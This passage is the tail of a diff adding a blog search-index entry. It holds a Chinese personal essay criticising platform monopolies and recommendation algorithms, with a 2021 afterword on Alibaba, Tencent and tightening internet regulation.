+<p>前文说到，现在很多大型社交平台垄断了互联网的内容，决定了用户看到什么、甚至决定了他们怎么思考、怎么行动，甚至怎么投出自己的选票。由于国内有较为严格的内容审核机制，这样的行为在国内并不算常见，更为常见的做法是：推荐算法。可以说，推荐算法，让互联网平台实现了垄断的又一次进化。</p>
+<p>原本推荐算法比较理想的作用应该是实现对优质资源的初步筛选，但由于厂商追求通过用户流量带动广告受益，致使推荐算法的作用变成了牢牢吸引用户的注意力，甚至不惜通过心理学原理让用户沉迷于刷手机。推荐算法的另一大危害是使用户的知识面变得越来越窄。用户只会接收到自己感兴趣的内容，久而久之就会产生“自己关注的世界就是世界的全部”的错误感觉（即<a href="https://baike.baidu.com/item/%E4%BF%A1%E6%81%AF%E8%8C%A7%E6%88%BF">信息茧房</a>）。</p>
+<p>所以我认为，拒绝一味接受被动推送的信息，主动获取信息与知识，拥有独立判断与思考的能力，应该是现代人应该拥有的良好习惯之一。而写博客和关注别人的博客，是培养这一习惯的方法之一。</p>
+<p>对于推荐算法，我在我的<a href="https://www.ohmysites.com/archives/19/">这篇文章</a>里有更多的思考和观点，欢迎围观。</p>
+<h2 id="后记"><a class="markdownIt-Anchor" href="#后记"></a> 后记</h2>
+<p>我的这篇文章写于 2020 年年初，我在一年后的今天再次回味这篇文章的时候，感慨良多。</p>
+<p>本文原本更多的讨论了腾讯的垄断行为，没想到站在 2021 年的今天来看，阿里却成了更早翻车的那一个。也可能是因为腾讯基本都是 2C 的业务，而阿里有不少 2B 的业务，而且它的 2C 业务看起来也相对“人畜无害”，所以网友的焦点和情绪更多的放在了腾讯的身上，所以这其实也是一个信息茧房。</p>
+<p>大概在 2019 年前后，B 站网友对于“有钱人”的态度发生了一次较大的转变。当然这也有可能和一批财经区 UP 主的入驻有关系。因为数字经济成为中国新的经济增长引擎，所以之前的中国政府对于互联网企业的监管不是很严格，监管部门更多的也是在摸索中进步，去年明显感觉有监管收紧的趋势。种种迹象都让我感觉，传说中的“互联网寒冬”可能真的快到了。</p>
+<p>但是最近我的这一想法又有了些许转变，或许所谓的“互联网寒冬”并不完全是一件坏事。2000 年美国反垄断部门对于微软的制约，并没有让微软就此衰落；而加入百度当年没有实现垄断，或许也不会沦落到今天的地步。</p>
+<blockquote class="blockquote-center">
+<p>对未来充满期待</p>
+
+</blockquote>
+<p>——这仍然是我现在，2021 年初，对互联网的感受。</p>
+]]></content>
+      <categories>
+        <category>随笔</category>
+      </categories>
+      <tags>
+        <tag>博客</tag>
+        <tag>互联网</tag>
+        <tag>推荐算法</tag>
+        <tag>垄断</tag>
+      </tags>
+  </entry>
+</search>
